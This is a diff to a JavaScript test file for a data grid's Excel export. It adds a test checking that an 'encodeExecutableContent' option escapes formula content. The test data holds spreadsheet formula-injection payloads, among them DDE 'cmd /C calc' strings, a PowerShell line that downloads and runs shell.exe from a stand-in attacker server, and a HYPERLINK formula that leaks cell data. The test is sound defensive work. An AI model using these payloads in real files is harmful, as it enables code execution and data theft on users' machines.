@@ -4,8 +4,6 @@ import ExcelJS from 'exceljs';
 import { ExcelJSDataGridTestHelper } from './ExcelJSTestHelper.js';
 import { exportDataGrid } from 'excel_exporter';
 import { Export } from 'exporter/exceljs/export';
-import { initializeDxObjectAssign, clearDxObjectAssign } from '../commonParts/objectAssignHelper.js';
-import { initializeDxArrayFind, clearDxArrayFind } from './arrayFindHelper.js';
 import ExcelJSLocalizationFormatTests from './exceljs.format.tests.js';
 import { ExcelJSOptionTests } from './exceljs.options.tests.js';
 import { LoadPanelTests } from '../commonParts/loadPanel.tests.js';
@@ -39,10 +37,6 @@ QUnit.testStart(() => {
 });
 
 const moduleConfig = {
-    before: function() {
-        initializeDxObjectAssign();
-        initializeDxArrayFind();
-    },
     beforeEach: function() {
         this.worksheet = new ExcelJS.Workbook().addWorksheet('Test sheet');
         this.customizeCellCallCount = 0;
@@ -55,10 +49,6 @@ const moduleConfig = {
     afterEach: function() {
         this.stub.restore();
     },
-    after: function() {
-        clearDxObjectAssign();
-        clearDxArrayFind();
-    }
 };
 
 // How to view a generated ExcelJS workbook in Excel:
@@ -6445,43 +6435,6 @@ const moduleConfig = {
     });
 });
 
-QUnit.module('Deprecated warnings', moduleConfig, () => {
-    QUnit.test('CustomizeCell handler - warnings when \'cell\' field is used', function(assert) {
-        assert.expect(4);
-        this.stub.restore();
-        this.stub = sinon.stub(errors, 'log', () => {
-            assert.deepEqual(errors.log.lastCall.args, [
-                'W0003',
-                'CustomizeCell handler argument',
-                'cell',
-                '20.1',
-                'Use the \'excelCell\' field instead'
-            ], 'args of the log method');
-        });
-
-        const done = assert.async();
-        const ds = [{ f1: 'f1_1' }];
-
-        const dataGrid = $('#dataGrid').dxDataGrid({
-            dataSource: ds,
-            loadingTimeout: null,
-            showColumnHeaders: false
-        }).dxDataGrid('instance');
-
-        exportDataGrid({
-            component: dataGrid,
-            worksheet: this.worksheet,
-            customizeCell: function({ cell, excelCell, gridCell }) {
-                assert.strictEqual(cell, excelCell, '\'cell\' field is the same that \'excelCell\' field');
-                assert.notStrictEqual(gridCell, undefined, 'gridCell');
-            }
-        }).then(() => {
-            assert.strictEqual(this.stub.callCount, 1, 'error.log.callCount');
-            done();
-        });
-    });
-});
-
 QUnit.module('OutlineLevel', moduleConfig, () => {
     QUnit.test('Outlinelevel property was applied before customizeCell callbacks were called', function(assert) {
         const done = assert.async();
@@ -6569,3 +6522,83 @@ LoadPanelTests.runTests(moduleConfig, exportDataGrid, (options) => $('#dataGrid'
         dataSource: [{ f1: 'f1_1' }],
         loadingTimeout: null
     }, 'worksheet');
+
+QUnit.module('encodeExecutableContent option', moduleConfig, () => {
+    QUnit.test('All executable cell content should be encoded if encodeExecutableContent = true', function(assert) {
+        const done = assert.async();
+
+        const dataSource = [
+            { value: '=test', expected: { excelCell: { value: '"\'=test"', numFmt: '@' } } },
+            { value: '="test"', expected: { excelCell: { value: '"\'=""test"""', numFmt: '@' } } },
+            { value: '="test ', expected: { excelCell: { value: '"\'=""test "', numFmt: '@' } } },
+            { value: '=cmd|\' /C calc\'!A1', expected: { excelCell: { value: '"\'=cmd|\' /C calc\'!A1"', numFmt: '@' } } },
+            { value: '5', expected: { excelCell: { value: '5' } } },
+            { value: '"5"', expected: { excelCell: { value: '"5"' } } },
+            { value: '+5', expected: { excelCell: { value: '+5', numFmt: '@' } } },
+            { value: '"+5"', expected: { excelCell: { value: '"+5"' } } },
+            { value: '-5', expected: { excelCell: { value: '-5', numFmt: '@' } } },
+            { value: '"-5"', expected: { excelCell: { value: '"-5"' } } },
+            { value: '5.5', expected: { excelCell: { value: '5.5' } } },
+            { value: '"5.5"', expected: { excelCell: { value: '"5.5"' } } },
+            { value: '-5.5', expected: { excelCell: { value: '-5.5', numFmt: '@' } } },
+            { value: '"-5.5"', expected: { excelCell: { value: '"-5.5"' } } },
+            { value: '+5.5', expected: { excelCell: { value: '+5.5', numFmt: '@' } } },
+            { value: '"+5.5"', expected: { excelCell: { value: '"+5.5"' } } },
+            { value: '=5', expected: { excelCell: { value: '"\'=5"', numFmt: '@' } } },
+            { value: '"=5"', expected: { excelCell: { value: '"\'=5"' } } },
+            { value: '@5', expected: { excelCell: { value: '"\'@5"', numFmt: '@' } } },
+            { value: '"@5"', expected: { excelCell: { value: '"\'@5"' } } },
+            { value: '=2+5', expected: { excelCell: { value: '"\'=2+5"', numFmt: '@' } } },
+            { value: '"=2+5"', expected: { excelCell: { value: '"\'=2+5"' } } },
+            { value: '+2+5', expected: { excelCell: { value: '"\'+2+5"', numFmt: '@' } } },
+            { value: '"+2+5"', expected: { excelCell: { value: '"\'+2+5"' } } },
+            { value: '-2+5', expected: { excelCell: { value: '"\'-2+5"', numFmt: '@' } } },
+            { value: '"-2+5"', expected: { excelCell: { value: '"\'-2+5"' } } },
+            { value: '+', expected: { excelCell: { value: '+', numFmt: '@' } } },
+            { value: '"+"', expected: { excelCell: { value: '"+"' } } },
+            { value: '=++', expected: { excelCell: { value: '"\'=++"', numFmt: '@' } } },
+            { value: '"=++"', expected: { excelCell: { value: '"\'=++"' } } },
+            { value: '-', expected: { excelCell: { value: '-', numFmt: '@' } } },
+            { value: '"-"', expected: { excelCell: { value: '"-"' } } },
+            { value: '=', expected: { excelCell: { value: '=', numFmt: '@' } } },
+            { value: '"="', expected: { excelCell: { value: '"="' } } },
+            { value: '@', expected: { excelCell: { value: '@', numFmt: '@' } } },
+            { value: '@MyData"Column', expected: { excelCell: { value: '"\'@MyData""Column"', numFmt: '@' } } },
+            { value: '"@"', expected: { excelCell: { value: '"@"' } } },
+            { value: '=1+2";=1+2', expected: { excelCell: { value: '"\'=1+2"";=1+2"', numFmt: '@' } } },
+            { value: '=1+2\'" ;,=1+2', expected: { excelCell: { value: '"\'=1+2\'"" ;,=1+2"', numFmt: '@' } } },
+            { value: '=CONCATENATE("1","2")', expected: { excelCell: { value: '"\'=CONCATENATE(""1"",""2"")"', numFmt: '@' } } },
+            { value: '\ttab', expected: { excelCell: { value: '"\'	tab"' } } },
+            { value: '\rCarriage return', expected: { excelCell: { value: '"\'\rCarriage return"' } } },
+            { value: '\r=2+3', expected: { excelCell: { value: '"\'\r=2+3"' } } },
+            { value: '=DDE ("cmd";"/C calc";"!A0")A0', expected: { excelCell: { value: '"\'=DDE (""cmd"";""/C calc"";""!A0"")A0"', numFmt: '@' } } },
+            { value: '@SUM(1+9)*cmd|\' /C calc\'!A0', expected: { excelCell: { value: '"\'@SUM(1+9)*cmd|\' /C calc\'!A0"', numFmt: '@' } } },
+            { value: '=10+20+cmd|\' /C calc\'!A0\'', expected: { excelCell: { value: '"\'=10+20+cmd|\' /C calc\'!A0\'"', numFmt: '@' } } },
+            { value: '=cmd|\' /C notepad\'!\'A1\'', expected: { excelCell: { value: '"\'=cmd|\' /C notepad\'!\'A1\'"', numFmt: '@' } } },
+            { value: '=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0\'', expected: { excelCell: { value: '"\'=cmd|\'/C powershell IEX(wget attacker_server/shell.exe)\'!A0\'"', numFmt: '@' } } },
+            { value: '=cmd|\'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1', expected: { excelCell: { value: '"\'=cmd|\'/c rundll32.exe \\10.0.0.1\\3\\2\\1.dll,0\'!_xlbgnm.A1"', numFmt: '@' } } },
+            { value: '=HYPERLINK("http://example.com?leak="&A1&A2,"Error: please click for further information")', expected: { excelCell: { value: '"\'=HYPERLINK(""http://example.com?leak=""&A1&A2,""Error: please click for further information"")"', numFmt: '@' } } },
+        ];
+
+        const dataGrid = $('#dataGrid').dxDataGrid({
+            columns: [{ dataField: 'value' }],
+            dataSource,
+            showColumnHeaders: false,
+            loadingTimeout: null
+        }).dxDataGrid('instance');
+
+        const expectedCells = dataSource.map((cell) => [cell.expected]);
+
+        helper._extendExpectedCells(expectedCells, { row: 1, column: 1 });
+
+        exportDataGrid({
+            component: dataGrid,
+            worksheet: this.worksheet,
+            encodeExecutableContent: true,
+        }).then(() => {
+            helper.checkValues(expectedCells);
+            helper.checkCellFormat(expectedCells);
+            done();
+        });
+    });
+});
